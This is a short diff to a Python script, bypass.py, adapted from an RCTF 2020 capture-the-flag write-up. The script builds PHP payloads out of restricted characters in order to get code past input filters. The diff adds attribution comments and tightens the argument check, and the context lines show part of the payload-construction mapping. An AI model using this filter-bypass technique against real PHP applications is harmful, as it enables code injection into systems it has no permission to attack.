@@ -4,6 +4,14 @@ import sys
 import pipes
 import urllib.parse
 
+"""
+============= BEGIN
+
+The following is code adapted from @wongwaituck on github.
+
+https://waituck.sg/web/rctf2020/php/2020/06/10/rctf-2020-calc-writeup.html
+
+"""
 mapping = {
     64: "(((1/0).(1)){0})&(((1/0).(1)){2})",
     48: '(0).(0){0}',
@@ -44,7 +52,16 @@ def construct_string(s):
     payload += ")"
     return payload
 
-if (len(sys.argv) < 2):
+"""
+============= END
+
+The above is code adapted from @wongwaituck on github.
+
+https://waituck.sg/web/rctf2020/php/2020/06/10/rctf-2020-calc-writeup.html
+
+"""
+
+if (len(sys.argv) < 2 or len(sys.argv) > 3 ):
 	print("Usage: python3 bypass.py phpcode:<string> safechars:<string>")
 	exit(0)
 
